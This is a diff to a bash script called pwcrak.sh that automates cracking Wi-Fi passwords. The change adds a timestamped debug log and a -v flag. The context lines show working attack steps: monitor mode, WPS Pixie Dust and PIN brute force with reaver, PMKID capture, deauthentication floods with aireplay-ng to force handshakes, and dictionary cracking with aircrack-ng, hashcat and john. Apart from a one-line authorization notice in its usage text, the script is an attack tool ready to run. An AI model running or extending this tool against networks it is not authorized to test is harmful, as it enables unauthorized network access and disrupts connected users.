@@ -27,6 +27,13 @@ warn()    { echo "${YELLOW}[!]${NC} $*"; }
 fail()    { echo "${RED}[✗]${NC} $*"; }
 die()     { fail "$*"; exit 1; }
 
+# timestamped debug log — always written to $WORK/debug.log, mirrored to console with -v
+dbg() {
+    local line="[$(date '+%H:%M:%S')] $*"
+    [[ -z "${WORK:-}" ]] || printf '%s\n' "$line" >> "$WORK/debug.log"
+    if (( VERBOSE )); then echo "${CYAN}[dbg]${NC} $*"; fi
+}
+
 # ---------- defaults ----------
 IFACE=""
 MON=""
@@ -46,6 +53,8 @@ MON_STARTED=0
 NM_STATE=""
 WPA_STATE=""
 SUCCESS=0
+VERBOSE=0
+ORIG_ARGS="$*"
 
 usage() {
     cat <<'USAGE'
@@ -67,13 +76,14 @@ Usage:
   sudo ./pwcrak.sh -w /path/list.txt  custom wordlist
   sudo ./pwcrak.sh -b AA:BB:CC:DD:EE:FF [-e "MySSID"]   skip scan if known
   sudo ./pwcrak.sh -t 60              scan seconds per pass
+  sudo ./pwcrak.sh -v                 verbose: also mirror debug log to console
 
 Only run against networks you own or are explicitly authorized to test.
 USAGE
     exit 0
 }
 
-while getopts ":i:w:b:c:e:at:h" opt; do
+while getopts ":i:w:b:c:e:at:vh" opt; do
     case $opt in
         i) IFACE="$OPTARG" ;;
         w) WORDLIST="$OPTARG" ;;
@@ -82,12 +92,14 @@ while getopts ":i:w:b:c:e:at:h" opt; do
         e) TARGET_ESSID="$OPTARG" ;;
         a) AUTO=1 ;;
         t) SCAN_TIME="$OPTARG" ;;
+        v) VERBOSE=1 ;;
         h) usage ;;
         *) usage; exit 1 ;;
     esac
 done
 
 cleanup() {
+    dbg "cleanup: MON='${MON:-}' MON_STARTED=$MON_STARTED NM_STATE='${NM_STATE:-}' SUCCESS=$SUCCESS"
     if [[ -n "${MON:-}" && "$MON_STARTED" -eq 1 ]]; then
         airmon-ng stop "$MON" >/dev/null 2>&1
     fi
@@ -160,6 +172,7 @@ prepare_workdir() {
     WORK="$(pwd)/pwcrak_work_$(date +%Y%m%d_%H%M%S)"
     mkdir -p "$WORK"
     ok "Working dir: $WORK"
+    info "Debug log: $WORK/debug.log (mirror to console with -v)"
 }
 
 prepare_wordlist_plain() {
@@ -176,6 +189,7 @@ prepare_wordlist_plain() {
 kill_services() {
     NM_STATE=$(systemctl is-active NetworkManager 2>/dev/null || echo "")
     WPA_STATE=$(systemctl is-active wpa_supplicant 2>/dev/null || echo "")
+    dbg "services before monitor: NetworkManager='${NM_STATE}' wpa_supplicant='${WPA_STATE}'"
     if [[ -n "$NM_STATE" || -n "$WPA_STATE" ]]; then
         info "Stopping network managers so monitor mode works cleanly..."
         airmon-ng check kill >/dev/null 2>&1
@@ -203,6 +217,7 @@ start_monitor() {
     [[ -n "$MON" ]] || die "Could not enter monitor mode. Your adapter may not support injection."
     MON_STARTED=1
     ok "Monitor interface: $MON"
+    dbg "monitor up: $MON (phy iface $IFACE)"
 }
 
 stop_monitor() {
@@ -210,6 +225,7 @@ stop_monitor() {
         info "Restoring managed mode..."
         airmon-ng stop "$MON" >/dev/null 2>&1
         MON_STARTED=0
+        dbg "monitor stopped: $MON"
     fi
 }
 
@@ -221,8 +237,10 @@ run_wps_sweep() {
     fi
     info "Sweeping for WPS-capable networks (20s)..."
     timeout -k 5 20 wash -i "$MON" >> "$WORK/wash.log" 2>/dev/null
+    dbg "wash sweep rc=$? (log: $WORK/wash.log)"
     awk 'tolower($1) ~ /^[0-9a-f:]{17}$/ {print tolower($1), (tolower($5)=="yes" ? "wps-locked" : "wps")}' \
         "$WORK/wash.log" | sort -u | awk '!seen[$1]++' > "$WORK/wps_tags"
+    dbg "wps tags: $(wc -l < "$WORK/wps_tags" 2>/dev/null || echo 0) network(s)"
 }
 
 wps_tag_of() {
@@ -245,6 +263,7 @@ lookup_target_from_scan() {
     TARGET_ENC=$(awk -F',' -v b="$TARGET_BSSID" '
         $1 ~ /^[0-9A-Fa-f:]{17}$/ && tolower($1)==tolower(b) {e=$6; gsub(/^[ \t]+|[ \t]+$/,"",e); print e; exit}' "$csv")
     ok "Target: ${TARGET_ESSID:--}  BSSID: $TARGET_BSSID  CH: $TARGET_CH  ENC: ${TARGET_ENC:-?}"
+    dbg "target resolved from scan: essid='${TARGET_ESSID:-}' ch=$TARGET_CH enc='${TARGET_ENC:-}'"
     if [[ -z "$TARGET_ESSID" || "$TARGET_ESSID" == *"<length:"* ]]; then
         warn "Hidden/blank SSID — dictionary cracking needs the real ESSID (pass -e \"Name\"); WPS/PMKID still work."
     fi
@@ -285,13 +304,18 @@ scan_targets() {
         info "Pass $round: scanning ${SCAN_TIME}s across 2.4/5 GHz (hopping all channels)..."
         timeout -k 5 "$SCAN_TIME" airodump-ng -w "$WORK/scan_r${round}" --output-format csv "$MON" >/dev/null 2>&1
         local scan_rc=$?
+        dbg "pass $round: airodump-ng rc=$scan_rc (124=timeout ok, 137=force-killed, 0=clean exit)"
         if (( scan_rc == 137 )); then
             warn "airodump-ng ignored SIGTERM and was force-killed — driver wedge suspected (typical with Realtek 88xx dkms); keeping partial capture."
         fi
         csv=$(ls -t "$WORK"/scan_r${round}-0*.csv 2>/dev/null | head -n1)
         if [[ -n "$csv" ]]; then
+            local new_aps
+            new_aps=$(awk '/^ *Station MAC,/{exit} {print}' "$csv" | grep -cE '^[0-9A-Fa-f]{2}:')
             awk '/^ *Station MAC,/{exit} {print}' "$csv" | cat - "$WORK/targets.csv" > "$WORK/targets.new"
             mv "$WORK/targets.new" "$WORK/targets.csv"
+            info "Pass $round saw $new_aps network(s)."
+            dbg "pass $round: csv=$csv aps=$new_aps"
         else
             warn "Pass $round captured nothing (driver/channel issue? run longer with -t)."
         fi
@@ -316,6 +340,7 @@ scan_targets() {
             stop_monitor
             die "No interactive input available (stdin closed) — aborting instead of looping on rescans."
         fi
+        dbg "operator input: '${pick}'"
         case "$pick" in
             r|R) round=$((round+1)); continue ;;
             q|Q) stop_monitor; die "Aborted by user." ;;
@@ -352,6 +377,8 @@ check_wps_presence() {
     info "Checking if target supports WPS (wash, 15s)..."
     local out
     out=$(timeout -k 5 15 wash -i "$MON" -c "$TARGET_CH" 2>/dev/null)
+    local wash_rc=$?
+    dbg "wash target check (ch $TARGET_CH) rc=$wash_rc, output lines: $(echo "$out" | grep -c .)"
     if echo "$out" | grep -qiw "$TARGET_BSSID"; then
         ok "WPS enabled — Pixie Dust may apply."
         return 0
@@ -388,6 +415,7 @@ attack_wps_pixie() {
     info "=== WPS Pixie Dust attack (usually takes seconds) ==="
     local log="$WORK/pixie.log"
     timeout -k 5 300 reaver -i "$MON" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -K 1 > "$log" 2>&1
+    dbg "reaver pixie rc=$? (log: $log)"
     tail -n 20 "$log"
     if parse_reaver_log "$log"; then
         ok "Pixie Dust succeeded — WPS vulnerable router."
@@ -402,6 +430,7 @@ attack_wps_pin() {
     local log="$WORK/pin.log"
     reaver -i "$MON" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -d 1 --fail-wait=5 > "$log" 2>&1 &
     local pid=$!
+    dbg "reaver pin started: pid=$pid (log: $log; polling every 10s for PIN/PSK)"
     while kill -0 "$pid" 2>/dev/null; do
         if parse_reaver_log "$log"; then
             kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
@@ -420,11 +449,13 @@ attack_pmkid() {
     timeout -k 5 "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" \
         --filterlist_ap="$WORK/target_filter" --filtermode=2 --enable_status=1 \
         2>&1 | tee "$WORK/pmkid_status.log" || ok_run=0
+    dbg "hcxdumptool (filtered) finished, ok_run=$ok_run (status: $WORK/pmkid_status.log)"
     if [[ "$ok_run" -eq 0 ]]; then
         warn "filterlist unsupported by this hcxdumptool build — retrying unfiltered."
         timeout -k 5 "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" --enable_status=1 2>&1 | tail -n 5
     fi
     hcxpcapngtool -o "$WORK/pmkid.22000" "$WORK/pmkid.pcapng" 2>/dev/null
+    dbg "pmkid.22000 extracted: $(stat -c %s "$WORK/pmkid.22000" 2>/dev/null || echo 0) byte(s)"
     if [[ -s "$WORK/pmkid.22000" ]]; then
         ok "PMKID captured — cracking wordlist now."
         crack_hash_22000 "$WORK/pmkid.22000"
@@ -441,6 +472,7 @@ attack_handshake() {
     ( airodump-ng -w "$WORK/hs" --output-format pcap -c "$TARGET_CH" --bssid "$TARGET_BSSID" "$MON" \
         > "$WORK/aidump.log" 2>&1 ) &
     local aid=$!
+    dbg "handshake capture: airodump pid=$aid, ch $TARGET_CH, bssid $TARGET_BSSID, wait ${HANDSHAKE_WAIT}s (log: $WORK/aidump.log)"
     sleep 5
     info "Sending $DEAUTH_COUNT deauth frames..."
     aireplay-ng -0 "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON" >/dev/null 2>&1
@@ -466,6 +498,7 @@ attack_handshake() {
 
     local cap
     cap=$(ls -t "$WORK"/hs-0*.cap 2>/dev/null | head -n1)
+    dbg "capture files present: $(ls "$WORK"/hs-0*.cap 2>/dev/null | tr '\n' ' ')"
     [[ -n "$cap" ]] || { warn "No capture file written."; return 1; }
 
     hcxpcapngtool -o "$WORK/handshake.22000" "$cap" 2>/dev/null
@@ -474,11 +507,14 @@ attack_handshake() {
     fi
     if [[ "$SUCCESS" -eq 0 ]]; then
         info "Cracking capture with aircrack-ng..."
-        local out essid_args=()
+        local out wl_air essid_args=()
+        wl_air=$(wordlist_for)
+        dbg "aircrack-ng -b $TARGET_BSSID -w $wl_air $cap (log: $WORK/aircrack.log)"
         if [[ -n "$TARGET_ESSID" && "$TARGET_ESSID" != *"<length:"* ]]; then
             essid_args=(-e "$TARGET_ESSID")
         fi
-        out=$(aircrack-ng -b "$TARGET_BSSID" "${essid_args[@]}" -w "$(wordlist_for)" -l "$WORK/found.key" "$cap" 2>&1 | tee "$WORK/aircrack.log")
+        out=$(aircrack-ng -b "$TARGET_BSSID" "${essid_args[@]}" -w "$wl_air" -l "$WORK/found.key" "$cap" 2>&1 | tee "$WORK/aircrack.log")
+        dbg "aircrack finished; found.key: $(stat -c %s "$WORK/found.key" 2>/dev/null || echo 0) byte(s)"
         echo "$out" | tail -n 5
         if [[ -s "$WORK/found.key" ]]; then
             local key
@@ -502,11 +538,13 @@ crack_hash_22000() {
     local wl
     wl=$(prepare_wordlist_plain) || return 1
     [[ -n "$wl" && -s "$wl" ]] || { warn "No wordlist for hash cracking."; return 1; }
+    dbg "cracking $hashfile with wordlist $wl ($(wc -l < "$wl" 2>/dev/null || echo '?') candidates)"
 
     if command -v hashcat >/dev/null 2>&1; then
         info "hashcat -m 22000 (stop with Ctrl-C)..."
         hashcat -m 22000 -a 0 --force --potfile-path="$WORK/hashcat.pot" \
             "$hashfile" "$wl" -o "$WORK/hashcat.out" 2>&1 | tail -n 5
+        dbg "hashcat finished (pot: $WORK/hashcat.pot, out: $WORK/hashcat.out)"
         if [[ -s "$WORK/hashcat.out" ]]; then
             local psk
             psk=$(tr ':' '\n' < "$WORK/hashcat.out" | tail -n1)
@@ -525,6 +563,7 @@ crack_hash_22000() {
     if [[ "$SUCCESS" -eq 0 ]] && command -v john >/dev/null 2>&1; then
         info "john the ripper fallback..."
         john --wordlist="$wl" --pot="$WORK/john.pot" "$hashfile" 2>&1 | tail -n 3
+        dbg "john finished (pot: $WORK/john.pot)"
         local shown
         shown=$(john --show "$hashfile" --pot="$WORK/john.pot" 2>/dev/null)
         if [[ -n "$shown" ]]; then
@@ -571,6 +610,7 @@ main_menu() {
     echo "  5) Handshake + dictionary"
     echo "  6) Quit"
     read -r -p "$(echo "${CYAN}[*]${NC} Choose: ")" choice
+    dbg "menu choice: '${choice}'"
     case $choice in
         1) run_all ;;
         2) attack_wps_pixie; report_summary ;;
@@ -585,6 +625,8 @@ main() {
     check_deps
     resolve_wordlist
     prepare_workdir
+    dbg "start: $0 $ORIG_ARGS"
+    dbg "wordlist=${WORDLIST:-none} auto=$AUTO iface='${IFACE:-auto-prompt}' scan_time=$SCAN_TIME pmkid_time=$PMKID_TIME"
     start_monitor
     scan_targets
     confirm_target
